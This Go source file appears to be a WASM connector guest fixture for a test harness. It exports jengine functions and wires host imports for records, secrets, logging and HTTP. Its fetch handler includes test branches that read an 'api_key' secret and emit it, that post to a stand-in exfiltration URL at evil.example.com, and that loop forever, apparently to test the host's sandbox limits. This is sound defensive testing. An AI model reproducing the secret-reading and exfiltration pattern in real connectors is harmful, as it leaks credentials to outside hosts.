// Command guest is a minimal WASM connector fixture used only by
// testharness's own tests - built via `GOOS=wasip1 GOARCH=wasm go
// build -buildmode=c-shared` (a WASI reactor/library, callable exports
// via //go:wasmexport, no TinyGo needed for these tests). The real SDK
// (sdk/connector/wasmguest) targets TinyGo per the design's own
// explicit choice (§3.1) - this fixture exists purely to exercise
// testharness's host-function wiring end-to-end without requiring
// TinyGo installed in every environment that runs `go test` on this
// module. It intentionally mirrors
// internal/ingestion/wasmrunner/testdata/guest/main.go exactly, since
// both packages independently wire the same jengine_host surface.
package main

import "unsafe"

var buf [4096]byte

//go:wasmexport jengine_alloc
func jengineAlloc(size uint32) uint32 {
	return uint32(uintptr(unsafe.Pointer(&buf[0])))
}

//go:wasmexport jengine_fetch
func jengineFetch(configPtr, configLen uint32) int32 {
	cfg := ptrToBytes(configPtr, configLen)
	log(1, "fetch called with config: "+string(cfg))

	if string(cfg) == "trigger-secret" {
		secretBuf := make([]byte, 256)
		n := getSecret("api_key", secretBuf)
		if n < 0 {
			log(2, "secret denied or not found")
		} else {
			emitRecord(secretBuf[:n])
		}
		return 0
	}

	if string(cfg) == "trigger-egress" {
		reqBuf := []byte("http://evil.example.com/exfiltrate\nbody")
		respBuf := make([]byte, 256)
		httpFetch(reqBuf, respBuf)
		return 0
	}

	if string(cfg) == "infinite-loop" {
		// See internal/ingestion/wasmrunner's own fixture for why this
		// calls a host function each iteration rather than spinning on
		// pure guest-local computation - that's the sharper, real
		// wazero Close()-interruption finding this mirrors.
		for {
			log(0, "looping")
		}
	}

	emitRecord([]byte(`{"id":"rec-1","amount":"100.00"}`))
	emitRecord([]byte(`{"id":"rec-2","amount":"200.00"}`))
	return 0
}

//go:wasmexport jengine_validate
func jengineValidate(configPtr, configLen uint32) int32 {
	cfg := ptrToBytes(configPtr, configLen)
	if len(cfg) == 0 {
		return -4
	}
	return 0
}

//go:wasmexport jengine_supports_streaming
func jengineSupportsStreaming() uint32 {
	return 0
}

func ptrToBytes(ptr, length uint32) []byte {
	if length == 0 {
		return nil
	}
	return unsafe.Slice((*byte)(unsafe.Pointer(uintptr(ptr))), length)
}

//go:wasmimport jengine_host emit_record
func emitRecordHost(ptr, length uint32) int32

func emitRecord(data []byte) int32 {
	if len(data) == 0 {
		return 0
	}
	p := uint32(uintptr(unsafe.Pointer(&data[0])))
	return emitRecordHost(p, uint32(len(data)))
}

//go:wasmimport jengine_host get_secret
func getSecretHost(keyPtr, keyLen, outPtr, outLen uint32) int32

func getSecret(key string, out []byte) int32 {
	kb := []byte(key)
	kp := uint32(uintptr(unsafe.Pointer(&kb[0])))
	op := uint32(uintptr(unsafe.Pointer(&out[0])))
	return getSecretHost(kp, uint32(len(kb)), op, uint32(len(out)))
}

//go:wasmimport jengine_host log
func logHost(level int32, msgPtr, msgLen uint32)

func log(level int32, msg string) {
	mb := []byte(msg)
	if len(mb) == 0 {
		return
	}
	mp := uint32(uintptr(unsafe.Pointer(&mb[0])))
	logHost(level, mp, uint32(len(mb)))
}

//go:wasmimport jengine_host http_fetch
func httpFetchHost(reqPtr, reqLen, outPtr, outLen uint32) int32

func httpFetch(req []byte, out []byte) int32 {
	rp := uint32(uintptr(unsafe.Pointer(&req[0])))
	op := uint32(uintptr(unsafe.Pointer(&out[0])))
	return httpFetchHost(rp, uint32(len(req)), op, uint32(len(out)))
}

func main() {}
